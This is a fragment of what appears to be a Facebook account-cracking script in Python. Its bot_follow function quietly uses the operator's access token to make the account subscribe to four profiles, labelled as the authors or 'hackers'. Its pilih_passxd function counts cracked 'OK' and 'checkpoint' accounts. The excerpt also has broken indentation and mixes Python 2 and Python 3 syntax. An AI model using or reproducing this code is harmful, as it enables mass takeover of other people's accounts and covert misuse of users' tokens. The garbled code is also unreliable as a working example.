...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #FAISU
    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #HACKER
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #BAWA
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #WOLD HACKER
...
def pilih_passxd():
	...
	print "   [•] Total OK/oh my god: "+str(len(oks))+"/"+str(len(cekpoint))
